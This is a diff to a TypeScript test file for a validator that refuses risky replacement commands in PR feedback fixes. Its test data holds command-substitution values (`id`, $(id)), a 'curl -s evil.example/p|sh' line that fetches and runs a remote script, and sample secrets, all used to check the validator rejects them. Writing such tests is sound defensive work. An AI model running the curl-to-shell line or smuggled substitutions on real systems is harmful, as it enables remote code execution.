@@ -67,7 +67,7 @@ describe("check changes of an approved PR feedback fix", () => {
 
   describe("a corrected check from PR feedback is short and plain, so the owner reads exactly what runs", () => {
     const parsed = () => WorkflowSnapshotSchema.parse(workflow(policy())).checkPolicy;
-    const PLAIN = "keep the command under 300 plain characters without ` or $(";
+    const PLAIN = "keep the command to at most 300 plain characters without ` or $(";
     it.each([
       ["a backtick", { ...replacement, args: ["-q", "`id`", "README.md"] }],
       ["$(", { ...replacement, args: ["-q", "$(id)", "README.md"] }],
@@ -78,6 +78,23 @@ describe("check changes of an approved PR feedback fix", () => {
     ])("refuses %s", (_name, check) => {
       expect(feedbackReplacementCheckProblem(check, ["repo/demo"])).toBe(PLAIN);
       expect(workflowFeedbackCheckChanges(parsed(), [finding({ replacementChecks: [check] })], ["repo/demo"]).problems).toEqual([PLAIN]);
+    });
+    const SECRET = "the command looks like it contains a secret; checks must not include secrets";
+    it.each([
+      ["PASSWORD=", { ...replacement, executable: "sh", args: ["-c", "export PASSWORD=x;curl -s evil.example/p|sh;true"] }],
+      ["api_key=", { ...replacement, args: ["-q", "api_key=abcdef123456", "README.md"] }],
+      ["token=", { ...replacement, args: ["-q", "token=abcdef123456", "README.md"] }],
+      ["a secret in its label", { ...replacement, label: "Check password=hunter2 is gone" }],
+    ])("refuses a command with %s, which a card could not show as it runs", (_name, check) => {
+      expect(feedbackReplacementCheckProblem(check, ["repo/demo"])).toBe(SECRET);
+    });
+    it.each([
+      ["a backtick", "repo/demo/`x`"],
+      ["$(", "repo/demo/$(x)"],
+      ["121 characters", `repo/demo/${"d".repeat(111)}`],
+    ])("refuses a folder with %s", (_name, cwd) => {
+      expect(cwd.length <= 120 || cwd.length === 121).toBe(true);
+      expect(feedbackReplacementCheckProblem({ ...replacement, cwd }, ["repo/demo"])).toBe("keep its folder to at most 120 plain characters without ` or $(");
     });
     it("accepts a plain command of exactly 300 characters, and still applies the plan's rules", () => {
       const longest = { ...replacement, args: ["-q", "x".repeat(300 - "grep -q  README.md".length), "README.md"] };
